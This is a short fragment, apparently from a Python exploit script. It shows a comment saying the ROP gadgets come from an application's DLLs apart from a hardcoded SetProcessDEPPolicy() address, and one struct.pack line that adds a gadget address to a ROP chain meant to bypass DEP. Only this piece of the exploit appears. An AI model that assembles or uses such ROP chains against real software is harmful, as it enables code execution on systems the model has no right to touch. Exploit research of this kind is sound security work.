...
# All ROP gadgets are from the APP's DLLs except for the hardcoded 
SetProcessDEPPolicy() address
...
rop += struct.pack('<L', 0x10010f68)  # INC EBX # CMP BYTE PTR 
SS:[EBP+5B],BL # RETN
